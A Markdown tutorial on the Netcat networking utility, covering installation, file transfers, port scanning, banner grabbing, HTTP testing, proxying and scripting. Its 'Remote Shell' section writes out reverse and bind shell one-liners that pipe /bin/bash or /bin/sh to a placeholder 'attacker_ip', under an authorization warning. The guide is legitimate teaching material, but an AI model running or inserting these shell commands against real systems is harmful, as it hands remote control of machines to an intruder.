# Netcat (nc)

## Introduction

## What is Netcat?

Netcat (often abbreviated as nc) is a versatile networking utility that reads and writes data across network connections using TCP or UDP protocols. It's often called the "Swiss Army knife" of networking tools due to its flexibility and wide range of applications.

## Why Netcat?

- Simple yet powerful network debugging tool
- Port scanning and banner grabbing
- File transfers between systems
- Network testing and troubleshooting
- Creating reverse shells (security testing)
- Chat servers and simple networking
- Available on most Unix-like systems

## Learning Path

1. Understand basic TCP/UDP concepts
2. Learn connection establishment (client/server)
3. Practice file transfers
4. Master port scanning techniques
5. Explore advanced use cases (proxying, relay)

## User Guide

## Prerequisites

- Linux/Unix system or Windows
- Basic understanding of networking
- Knowledge of TCP/IP and ports

Verify installation:

```bash
nc -h
# or
netcat -h
```

## Installation

### Ubuntu/Debian

```bash
sudo apt update
sudo apt install netcat-traditional
# Or the OpenBSD version
sudo apt install netcat-openbsd

# Set default (if multiple versions)
sudo update-alternatives --config nc
```

### RHEL/CentOS/Fedora

```bash
sudo yum install nc
# Or
sudo dnf install nc
```

### Arch Linux

```bash
sudo pacman -S openbsd-netcat
# Or traditional version
sudo pacman -S gnu-netcat
```

### macOS

```bash
# Usually pre-installed
# Or via Homebrew
brew install netcat
```

### Windows

```powershell
# Using Chocolatey
choco install netcat

# Or download ncat (Nmap's Netcat)
choco install nmap
```

## Basic Usage

### Client mode (connect to server)

```bash
# Connect to host on port
nc hostname port

# Examples
nc example.com 80
nc 192.168.1.100 8080

# Connect with timeout
nc -w 5 example.com 80

# UDP mode
nc -u hostname port
```

### Server mode (listen for connections)

```bash
# Listen on port
nc -l port

# Examples
nc -l 1234          # Listen on port 1234
nc -l -p 8080       # Listen on port 8080 (some versions)

# UDP listener
nc -u -l 1234

# Keep listening after client disconnects
nc -l -k 1234
```

## File Transfers

### Send file (sender)

```bash
# Sender (listening)
nc -l 1234 < file.txt

# Or receiver connects first
cat file.txt | nc -l 1234
```

### Receive file (receiver)

```bash
# Receiver (connecting)
nc sender_ip 1234 > received_file.txt
```

### Transfer entire directory

```bash
# Sender
tar czf - /path/to/directory | nc -l 1234

# Receiver
nc sender_ip 1234 | tar xzf -
```

### Transfer with progress

```bash
# Sender
pv file.iso | nc -l 1234

# Receiver
nc sender_ip 1234 | pv > file.iso
```

## Port Scanning

### Check if port is open

```bash
# Single port
nc -zv hostname 80

# Multiple ports
nc -zv hostname 20-25

# Scan range
nc -zv hostname 1-1000

# UDP scan
nc -zuv hostname 53
```

### Banner grabbing

```bash
# Grab service banner
echo "" | nc hostname 80

# HTTP request
echo -e "GET / HTTP/1.0\r\n\r\n" | nc example.com 80

# SMTP banner
nc mail.example.com 25

# SSH banner
nc ssh.example.com 22
```

### Quick port check script

```bash
#!/bin/bash
# Scan common ports
for port in 20 21 22 23 25 80 443 3306 5432; do
    nc -zv -w 1 $1 $port 2>&1 | grep succeeded
done
```

## Chat and Messaging

### Simple chat (two-way)

```bash
# Server
nc -l 1234

# Client
nc server_ip 1234

# Type messages on either side
```

### Broadcast chat (UDP)

```bash
# Listener
nc -u -l 1234

# Sender
echo "Broadcast message" | nc -u broadcast_ip 1234
```

## Remote Shell

### Basic shell listener

```bash
# Server (listener) - SECURITY RISK
nc -l 1234 -e /bin/bash

# Client
nc server_ip 1234
# Now you have a shell
```

### Reverse shell

```bash
# Attacker listening
nc -l 1234

# Target machine (connects back)
nc attacker_ip 1234 -e /bin/bash

# Or without -e flag
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 1234 > /tmp/f
```

### Bind shell

```bash
# Target (listening)
nc -l 1234 -e /bin/bash

# Attacker
nc target_ip 1234
```

**⚠️ Security Warning**: Remote shells should only be used in controlled environments for legitimate security testing with proper authorization.

## HTTP and Web Testing

### Manual HTTP request

```bash
# GET request
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80

# POST request
echo -e "POST /api HTTP/1.1\r\nHost: example.com\r\nContent-Length: 13\r\n\r\ndata=test123" | nc example.com 80

# Check headers
echo -e "HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```

### Simple HTTP server

```bash
# Create response file
cat > response.txt << 'EOF'
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 45

<html><body>Hello from Netcat!</body></html>
EOF

# Serve response
while true; do nc -l 8080 < response.txt; done
```

## Proxy and Relay

### Simple TCP proxy

```bash
# Create named pipes
mkfifo backpipe

# Relay traffic
nc -l 1234 0<backpipe | nc target_host 80 1>backpipe
```

### Port forwarding

```bash
# Forward local 8080 to remote 80
while true; do
    nc -l 8080 -c "nc remote_host 80"
done
```

## Advanced Usage

### Specify source port

```bash
# Connect from specific source port
nc -p 5555 hostname 80
```

### Specify source address

```bash
# Bind to specific local address
nc -s 192.168.1.50 hostname 80
```

### IPv4/IPv6

```bash
# Force IPv4
nc -4 hostname 80

# Force IPv6
nc -6 hostname 80
```

### Set timeout

```bash
# Wait 5 seconds for connection
nc -w 5 hostname 80

# Idle timeout
nc -i 10 hostname 80
```

### Verbose and quiet modes

```bash
# Verbose output
nc -v hostname 80

# Very verbose
nc -vv hostname 80

# Quiet mode
nc -q hostname 80
```

## Scripting with Netcat

### Check if service is available

```bash
#!/bin/bash
# Check if web server is up

if nc -zv -w 5 example.com 80 2>&1 | grep -q succeeded; then
    echo "Web server is up"
else
    echo "Web server is down"
fi
```

### Monitor port until available

```bash
#!/bin/bash
# Wait for port to be available

HOST=$1
PORT=$2

echo "Waiting for $HOST:$PORT..."
while ! nc -z $HOST $PORT 2>/dev/null; do
    sleep 1
done
echo "Port $PORT is now available!"
```

### Automated backup over network

```bash
#!/bin/bash
# Backup script using netcat

BACKUP_DIR="/data"
BACKUP_HOST="backup.server"
BACKUP_PORT=9999

tar czf - $BACKUP_DIR | nc $BACKUP_HOST $BACKUP_PORT
```

### Health check script

```bash
#!/bin/bash
# Check multiple services

SERVICES=(
    "web:80"
    "ssh:22"
    "mysql:3306"
)

for service in "${SERVICES[@]}"; do
    name="${service%%:*}"
    port="${service##*:}"
    
    if nc -zv -w 2 localhost $port &>/dev/null; then
        echo "✓ $name is running"
    else
        echo "✗ $name is down"
    fi
done
```

## Common Use Cases

### Test database connectivity

```bash
# MySQL
nc -zv mysql.server 3306

# PostgreSQL
nc -zv postgres.server 5432

# MongoDB
nc -zv mongo.server 27017

# Redis
nc -zv redis.server 6379
```

### Test mail server

```bash
# SMTP
nc mail.server 25

# Send email manually
EHLO localhost
MAIL FROM:<sender@example.com>
RCPT TO:<recipient@example.com>
DATA
Subject: Test
Test message
.
QUIT
```

### Debug DNS

```bash
# Test DNS server
nc -u dns.server 53
```

### Test HTTPS/SSL

```bash
# Connect to HTTPS (use openssl for SSL)
openssl s_client -connect example.com:443

# But nc can connect to the port
nc -zv example.com 443
```

### Stream audio/video

```bash
# Sender (streaming audio)
cat audio.mp3 | nc -l 1234

# Receiver (playing audio)
nc sender_ip 1234 | mpg123 -
```

### Remote backup

```bash
# Server (receiver)
nc -l 9999 | tar xzf -

# Client (sender)
tar czf - /important/data | nc backup_server 9999
```

## Ncat (Nmap's Netcat)

### Installation

```bash
# Install nmap package (includes ncat)
sudo apt install nmap

# Or standalone
# Available from nmap.org
```

### Ncat features

```bash
# SSL/TLS support
ncat --ssl hostname 443

# SSL server
ncat -l 1234 --ssl

# Execute commands
ncat -l 1234 --exec /bin/bash

# Access control
ncat -l 1234 --allow 192.168.1.0/24

# Broker mode (multi-client chat)
ncat -l 1234 --broker

# Maximum connections
ncat -l 1234 --max-conns 5
```

## Troubleshooting

### Connection refused

```bash
# Check if service is listening
sudo netstat -tlnp | grep :80
# Or
sudo ss -tlnp | grep :80

# Check firewall
sudo iptables -L
sudo firewall-cmd --list-all

# Verify host is reachable
ping hostname
```

### Permission denied (low ports)

```bash
# Ports below 1024 require root
sudo nc -l 80

# Or use higher port
nc -l 8080
```

### Address already in use

```bash
# Find process using port
sudo lsof -i :1234
# Or
sudo netstat -tlnp | grep 1234

# Kill process
sudo kill -9 <PID>
```

### nc command not found

```bash
# Install netcat
sudo apt install netcat-traditional

# Or check if installed as ncat
ncat --version
```

## Security Considerations

### Risk awareness

- **Open listeners**: Can be security vulnerabilities
- **Unencrypted**: All data sent in cleartext
- **Authentication**: None by default
- **Execute flag**: Can run arbitrary commands

### Best practices

```bash
# Bind to localhost only (not exposed to network)
nc -l 127.0.0.1 -p 1234

# Use specific interface
nc -l -s 192.168.1.100 -p 1234

# Add timeout to prevent hanging
nc -l -w 30 1234

# Use ncat with SSL for encryption
ncat -l 1234 --ssl

# Implement access control
ncat -l 1234 --allow 192.168.1.0/24
```

### Alternatives for production

```bash
# For secure file transfer: scp, rsync, sftp
scp file.txt user@host:/path/

# For remote shell: SSH
ssh user@host

# For encrypted communication: OpenSSL, socat
socat - openssl:hostname:443
```

## Quick Reference

### Essential options

```bash
-l              # Listen mode
-p <port>       # Port number
-u              # UDP mode
-v              # Verbose
-vv             # Very verbose
-z              # Zero-I/O (scan mode)
-w <seconds>    # Timeout
-n              # No DNS resolution
-k              # Keep listening
-e <program>    # Execute program (security risk)
```

### Common patterns

```bash
# Listen
nc -l 1234

# Connect
nc hostname 1234

# Port scan
nc -zv hostname 1-1000

# File transfer (send)
nc -l 1234 < file

# File transfer (receive)
nc hostname 1234 > file
```

## Real-World Examples

### Check if website is accessible

```bash
# Quick check
nc -zv google.com 80 443

# Get response
echo -e "GET / HTTP/1.0\r\n\r\n" | nc google.com 80
```

### Debug microservice communication

```bash
# Check if service port is open
nc -zv api-service 8080

# Test API endpoint
echo -e "GET /health HTTP/1.1\r\nHost: api-service\r\n\r\n" | nc api-service 8080
```

### Emergency file recovery

```bash
# Receiver (new server)
nc -l 9999 > backup.tar.gz

# Sender (dying server)
tar czf - /critical/data | nc new-server 9999
```

### Test load balancer

```bash
# Connect multiple times, check which backend answers
for i in {1..10}; do
    echo -e "GET / HTTP/1.1\r\nHost: lb.example.com\r\n\r\n" | nc lb.example.com 80 | grep Server
done
```

## Resources

- [Netcat man page](https://linux.die.net/man/1/nc)
- [Ncat documentation](https://nmap.org/ncat/)
- [Netcat cheat sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)

## Next Steps

- Learn socat for more advanced networking
- Explore nmap for comprehensive port scanning
- Study SSL/TLS with openssl s_client
- Practice with Wireshark to see netcat traffic
- Learn about SSH for secure remote access
